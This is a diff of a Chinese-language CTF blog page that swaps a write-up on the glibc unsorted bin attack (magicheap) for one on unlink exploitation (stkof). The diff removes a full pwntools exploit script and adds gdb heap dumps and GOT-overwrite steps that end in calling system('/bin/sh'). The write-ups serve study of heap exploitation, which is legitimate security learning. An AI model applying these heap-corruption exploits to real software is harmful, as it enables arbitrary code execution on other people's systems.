@@ -50,268 +50,194 @@
         <main id="main" class="site-main" role="main">
             <article id="post-1270" class="post-1270 post type-post status-publish format-standard hentry category-90 category-129 tag-149">
                 <header class="entry-header">
-                    <h1 class="entry-title">unsorted bin Attack</h1>
-                    <p class="entry-census">发布于 2020-12-02</p>
+                    <h1 class="entry-title">unlink</h1>
+                    <p class="entry-census">发布于 2020-12-03</p>
                     <hr>
                 </header>
                 <div class="neko">
-                    <p>unsorted bin Attack</p>
-<pre><code>  /* remove from unsorted list */
- if (__glibc_unlikely (bck-&gt;fd != victim))
-  malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);
- unsorted_chunks (av)-&gt;bk = bck;
- bck-&gt;fd = unsorted_chunks (av); 
- /*bck为向后的一个free chunk，fwd为向前的free chunk*/
-</code></pre>
-<p>假设一个p为unsorted bin</p>
-<p>当我们将一个p取出的时候，会将bck的值赋给unsorted_chunks (av)，同时将unsorted_chunks (av)赋给bck-&gt;fd,如果将p-&gt;bk的值改掉，改为target-0x10，</p>
-<p>victim=unsorted_chunks (av)-&gt;bk=p</p>
-<p>bck=p-&gt;bk=target-0x10</p>
-<p>unsorted_chunks (av)-&gt;bk = bck=target-0x10</p>
-<p>bck-&gt;fd=target-0x10+0x10=target=unsorted_chunks (av);</p>
-<p><strong>开始时</strong></p>
-<p>unsorted bin 的fd与bk指向它本身</p>
-<p><strong>执行free（p）</strong></p>
-<p>由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。</p>
-<p><strong>修改p-&gt;bk</strong></p>
-<p>经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</p>
-<p>申请400大小的chunk</p>
-<p>此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去unsorted bin中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。</p>
-<p>例子cifwiki-magicheap</p>
-<pre><code>      if ( v3 == 4869 )
-      {
-        if ( (unsigned __int64)magic &lt;= 0x1305 )
-        {
-          puts(&quot;So sad !&quot;);
-        }
-        else
-        {
-          puts(&quot;Congrt !&quot;);
-          l33t();
-        }
-</code></pre>
-<pre><code>int l33t()
+                    <p>unlink机制的利用</p>
+<p>利用思路</p>
+<p>1.UAF，可以修改free状态下smallbin或者unsorted bin的fd和bk指针</p>
+<p>2.已知位置存在一个指针指向可进行的UAF的chunk</p>
+<p>效果</p>
+<p>使得已指向UAF chunk的指针ptr变为ptr-0x18</p>
+<p>思路</p>
+<p>1.设指向UAF chunk的指针的地址为ptr</p>
+<p>2.修改fd为ptr-0x18</p>
+<p>2.修改bk为ptr-0x10</p>
+<p>3.触发unlink</p>
+<p>ptr处的指针变为ptr-0x18</p>
+<p>例子：ctfwiki-stkof</p>
+<pre><code>signed __int64 sub_4009E8()
 {
-  return system(&quot;cat ./flag&quot;);
-}
-</code></pre>
-<p>当magic &gt;0x1305时，拿到flag</p>
-<pre><code>unsigned __int64 edit_heap()
-{
-  size_t v0; // ST08_8
-  int v2; // [rsp+4h] [rbp-1Ch]
-  char buf; // [rsp+10h] [rbp-10h]
-  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
+  signed __int64 result; // rax
+  int i; // eax
+  unsigned int v2; // [rsp+8h] [rbp-88h]
+  __int64 n; // [rsp+10h] [rbp-80h]
+  char *ptr; // [rsp+18h] [rbp-78h]
+  char s; // [rsp+20h] [rbp-70h]
+  unsigned __int64 v6; // [rsp+88h] [rbp-8h]
 
-  v4 = __readfsqword(0x28u);
-  printf(&quot;Index :&quot;);
-  read(0, &amp;buf, 4uLL);
-  v2 = atoi(&amp;buf);
-  if ( v2 &lt; 0 || v2 &gt; 9 )
+  v6 = __readfsqword(0x28u);
+  fgets(&amp;s, 16, stdin);
+  v2 = atol(&amp;s);
+  if ( v2 &gt; 0x100000 )
+    return 0xFFFFFFFFLL;
+  if ( !::s[v2] )
+    return 0xFFFFFFFFLL;
+  fgets(&amp;s, 16, stdin);
+  n = atoll(&amp;s);
+  ptr = ::s[v2];
+  for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) )
   {
-    puts(&quot;Out of bound!&quot;);
-    _exit(0);
+    ptr += i;
+    n -= i;
   }
-  if ( heaparray[v2] )
-  {
-    printf(&quot;Size of Heap : &quot;, &amp;buf);
-    read(0, &amp;buf, 8uLL);
-    v0 = atoi(&amp;buf);
-    printf(&quot;Content of heap : &quot;, &amp;buf);
-    read_input(heaparray[v2], v0);
-    puts(&quot;Done !&quot;);
-  }
+  if ( n )
+    result = 0xFFFFFFFFLL;
   else
+    result = 0LL;
+  return result;
+}
+</code></pre>
+<p>存在堆溢出的情况</p>
+<p>这题在申请一个堆的时候会申请两个缓冲区，所以先申请一个堆chunk1把缓冲区申请下来，然后申请两个unsorted bin，chunk2，chunk3.</p>
+<pre><code>gdb-peda$ heap
+0x1176000 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x1011, 
+  fd = 0xa3434310a31, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x1177010 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0xa1, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x11770b0 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x411, 
+  fd = 0xa0a33, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x11774c0 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0xa1, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x1177560 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0xa1, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x1177600 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x20a01, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+
+</code></pre>
+<p>然后再chunk2的数据地方伪造fake chunk，fake chunk-&gt;fd=s+0x10-0x18,fake chunk-&gt;bk=s+0x10-0x10,</p>
+<pre><code>gdb-peda$ heap
+0x1176000 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x1011, 
+  fd = 0xa3036310a320a32, 
+  bk = 0x0, 
+  fd_nextsize = 0x91, 
+  bk_nextsize = 0x602138
+}
+0x1177010 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0xa1, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x11770b0 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x411, 
+  fd = 0xa4b4f, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x11774c0 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0xa1, 
+  fd = 0x0, 
+  bk = 0x91, 
+  fd_nextsize = 0x602138, 
+  bk_nextsize = 0x602140
+}
+0x1177560 {
+  prev_size = 0x90, 
+  size = 0xa0, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x1177600 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x20a01, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+
+</code></pre>
+<p>然后进行unlink，让s[2]=s-0x8,</p>
+<pre><code>0x602140:	0x0000000000000000	0x0000000001177020
+0x602150:	0x0000000000602138	0x0000000000000000
+</code></pre>
+<p>这时对chunk2修改就是修改s[2]所指的地方，这里可以修改s[1]为free_got的地址，s[2]为puts_got的地址，s[3]为atol_got的地址，</p>
+<pre><code>gdb-peda$ x/4gx 0x0602140
+0x602140:	0x0000000000000000	0x0000000000602018
+0x602150:	0x0000000000602020	0x0000000000602080
+
+</code></pre>
+<p>这是修改chunk1就是修改s[1]所指向的地方，这里把free_got处存储的free的地址改为puts_addr,这样调用free函数实际上执行的是puts函数，这里当free(chunk2)时，实际上是打印出puts_got中存储的puts函数的地址，</p>
+<pre><code>gdb-peda$ x/4gx 0x0602140
+0x602140:	0x0000000000000000	0x0000000000602018
+0x602150:	0x0000000000602020	0x0000000000602080
+gdb-peda$ x/4gx 0x0000000000602018
+0x602018 &lt;free@got.plt&gt;:	0x0000000000400760	0x00007f5e45fa86a0
+0x602028 &lt;fread@got.plt&gt;:	0x00007f5e45fa71b0	0x0000000000400786
+</code></pre>
+<p>然后得到system与/bin/sh的地址，然后修改chunk3就是修改s[3]所指向的地方，这里把atoi_got处存储的地址改为system的地址。</p>
+<pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  int v3; // eax
+  signed int v5; // [rsp+Ch] [rbp-74h]
+  char nptr; // [rsp+10h] [rbp-70h]
+  unsigned __int64 v7; // [rsp+78h] [rbp-8h]
+
+  v7 = __readfsqword(0x28u);
+  alarm(0x78u);
+  while ( fgets(&amp;nptr, 10, stdin) )
   {
-    puts(&quot;No such heap !&quot;);
-  }
-  return __readfsqword(0x28u) ^ v4;
-}
+    v3 = atoi(&amp;nptr);
 </code></pre>
-<p>堆溢出，没有对size的大小进行检测</p>
-<p>先申请三个堆，chunk0，chunk1，chunk2，</p>
-<pre><code>0x11df000 PREV_INUSE {
-  prev_size = 0x0, 
-  size = 0x111, 
-  fd = 0x61616161, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-}
-0x11df110 PREV_INUSE {
-  prev_size = 0x0, 
-  size = 0x111, 
-  fd = 0x62626262, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-}
-0x11df220 PREV_INUSE {
-  prev_size = 0x0, 
-  size = 0x211, 
-  fd = 0x63636363, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-}
-0x11df430 PREV_INUSE {
-  prev_size = 0x0, 
-  size = 0x20bd1, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-}
-
-</code></pre>
-<p>释放chunk1，</p>
-<pre><code>0x11df000 PREV_INUSE {
-  prev_size = 0x0, 
-  size = 0x111, 
-  fd = 0x61616161, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-}
-0x11df110 PREV_INUSE {
-  prev_size = 0x0, 
-  size = 0x111, 
-  fd = 0x7fb1a0a80b78 &lt;main_arena+88&gt;, 
-  bk = 0x7fb1a0a80b78 &lt;main_arena+88&gt;, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-}
-0x11df220 {
-  prev_size = 0x110, 
-  size = 0x210, 
-  fd = 0x63636363, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-}
-0x11df430 PREV_INUSE {
-  prev_size = 0x0, 
-  size = 0x20bd1, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-}
-</code></pre>
-<p>通过修改chunk0来进行堆溢出来修改chunk1-&gt;bk为magic-0x10，</p>
-<pre><code>0x11df000 PREV_INUSE {
-  prev_size = 0x0, 
-  size = 0x111, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-}
-0x11df110 PREV_INUSE {
-  prev_size = 0x0, 
-  size = 0x111, 
-  fd = 0x0, 
-  bk = 0x6020b0 &lt;stdin@@GLIBC_2.2.5&gt;, 
-  fd_nextsize = 0xa, 
-  bk_nextsize = 0x0
-}
-0x11df220 {
-  prev_size = 0x110, 
-  size = 0x210, 
-  fd = 0x63636363, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-}
-0x11df430 PREV_INUSE {
-  prev_size = 0x0, 
-  size = 0x20bd1, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-}
-gdb-peda$ bins
-fastbins
-0x20: 0x0
-0x30: 0x0
-0x40: 0x0
-0x50: 0x0
-0x60: 0x0
-0x70: 0x0
-0x80: 0x0
-unsortedbin
-all [corrupted]
-FD: 0x11df110 ◂— 0x0
-BK: 0x11df110 —▸ 0x6020b0 (stdin@@GLIBC_2.2.5) ◂— 0x0
-smallbins
-empty
-largebins
-empty
-
-</code></pre>
-<p>然后申请被释放的堆，这样就修改了magic的值</p>
-<pre><code>gdb-peda$ bins
-fastbins
-0x20: 0x0
-0x30: 0x0
-0x40: 0x0
-0x50: 0x0
-0x60: 0x0
-0x70: 0x0
-0x80: 0x0
-unsortedbin
-all [corrupted]
-FD: 0x11df110 ◂— 0x62626262 /* 'bbbb' */
-BK: 0x6020b0 (stdin@@GLIBC_2.2.5) ◂— 0x0
-smallbins
-empty
-largebins
-empty
-gdb-peda$ x/4gx 0x06020C0
-0x6020c0 &lt;magic&gt;:	0x00007fb1a0a80b78	0x0000000000000000
-
-</code></pre>
-<p>exp：</p>
-<pre><code>#!/usr/bin/env python2
-#-*-coding: utf-8 -*
-from pwn import *
-context.log_level='debug'
-r=process(&quot;./magicheap&quot;)
-#r=remote(&quot;220.249.52.133&quot;,33940)
-def add(size,content):
-    r.recvuntil(&quot;Your choice :&quot;)
-    r.sendline(&quot;1&quot;)
-    r.recvuntil(&quot;Size of Heap : &quot;)
-    r.sendline(str(size))
-    r.recvuntil(&quot;Content of heap:&quot;)
-    r.send(content)
-def edit(index,size,content):
-    r.recvuntil(&quot;Your choice :&quot;)
-    r.sendline(&quot;2&quot;)
-    r.recvuntil(&quot;Index :&quot;)
-    r.sendline(str(index))
-    r.recvuntil(&quot;Size of Heap : &quot;)
-    r.sendline(str(size))
-    r.recvuntil(&quot;Content of heap : &quot;)
-    r.sendline(content)
-def delete(index):
-    r.recvuntil(&quot;Your choice :&quot;)
-    r.sendline(&quot;3&quot;)
-    r.recvuntil(&quot;Index :&quot;)
-    r.sendline(str(index))
-gdb.attach(r)
-add(0x100,'aaaa')
-add(0x100,'bbbb')
-add(0x200,'cccc')
-delete(1)
-payload=p64(0)*32+p64(0)+p64(0x111)+p64(0)+p64(0x06020C0-0x10)
-edit(0,0x200,payload)
-add(0x100,'bbbb')
-r.recvuntil(&quot;Your choice :&quot;)
-r.sendline('4869')
-r.interactive()
-</code></pre>
+<p>这样在执行atoi函数时实际执行的system函数，然后发送/bin/sh的地址，拿到flag。</p>
 
                 </div>
             </article>
@@ -321,20 +247,14 @@ r.interactive()
         <div class="mdui-container">
             <div class="mdui-row">
                 
-                <a href="https://czh11.github.io/post/unlink/" class="mdui-ripple mdui-color-theme mdui-col-xs-2 mdui-col-sm-6 doc-footer-nav-left">
-                    <div class="doc-footer-nav-text">
-                        <i class="mdui-icon material-icons">arrow_back</i>
-                        <span class="doc-footer-nav-direction mdui-hidden-xs-down">上一篇文章</span>
-                        <div class="doc-footer-nav-chapter mdui-hidden-xs-down">unlink</div>
-                    </div>
-                </a>
+                <div class="mdui-col-xs-2 mdui-col-sm-6 doc-footer-nav-left"></div>
                 
                 
-                <a href="https://czh11.github.io/post/unlink-jia-dui-yi-chu/" class="mdui-ripple mdui-color-theme mdui-col-xs-10 mdui-col-sm-6 doc-footer-nav-right">
+                <a href="https://czh11.github.io/post/unsorted-bin-attack/" class="mdui-ripple mdui-color-theme mdui-col-xs-10 mdui-col-sm-6 doc-footer-nav-right">
                     <div class="doc-footer-nav-text">
                         <i class="mdui-icon material-icons">arrow_forward</i>
                         <span class="doc-footer-nav-direction">下一篇文章</span>
-                        <div class="doc-footer-nav-chapter">unlink加UAF堆溢出</div>
+                        <div class="doc-footer-nav-chapter">unsorted bin Attack</div>
                     </div>
                 </a>
                 
